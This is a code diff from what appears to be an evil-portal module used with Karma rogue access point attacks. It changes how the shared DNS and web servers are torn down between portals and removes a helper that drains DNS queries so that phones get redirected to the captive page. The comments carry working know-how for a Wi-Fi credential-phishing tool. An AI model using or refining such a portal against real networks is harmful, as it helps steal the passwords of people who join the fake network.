@@ -102,13 +102,18 @@ EvilPortal::EvilPortal(
 }
 
 EvilPortal::~EvilPortal() {
-    // The DNS server is a process-wide singleton shared by every portal
-    // instance and nothing used to stop it on teardown, so once a Karma portal
-    // was destroyed it kept answering queries with a softAP address that no
-    // longer existed, until the next portal happened to call start() again.
-    webServer.end();
-    if (dnsServer != nullptr) dnsServer->stop();
+    // Deliberately empty. An earlier version closed the web server and stopped
+    // the DNS server here, to keep a destroyed portal from leaving the shared
+    // DNS answering. It broke the hand-over between Karma's ESSIDs: the second
+    // portal came up with no page to serve. Both are process-wide resources
+    // that the next portal's beginAP() rebinds anyway -- DNSServer::start()
+    // closes its socket before listening again -- so tearing them down from a
+    // per-portal destructor only creates a window where the next portal has to
+    // win a race for the same port. Karma stops the DNS server itself when it
+    // is done with portals for good: see stopEvilPortalDns().
 }
+
+void stopEvilPortalDns() { sharedEvilPortalDnsServer().stop(); }
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
     AsyncResponseStream *response = request->beginResponseStream("text/html");
@@ -461,16 +466,6 @@ void EvilPortal::loop() {
             verifyPass = false;
         }
     }
-}
-
-// DNSServer::processNextRequest() answers exactly one query per call, so a
-// portal whose DNS is pumped once per heartbeat answers two lookups a second.
-// A phone checking for a captive portal fires a burst of them and gives up
-// long before that: it associates, takes its lease, and is never redirected.
-// Draining the queue is what makes the redirect happen.
-void EvilPortal::pumpDNS(uint8_t maxRequests) {
-    if (dnsServer == nullptr) return;
-    for (uint8_t i = 0; i < maxRequests; i++) dnsServer->processNextRequest();
 }
 
 void EvilPortal::processRequests() {
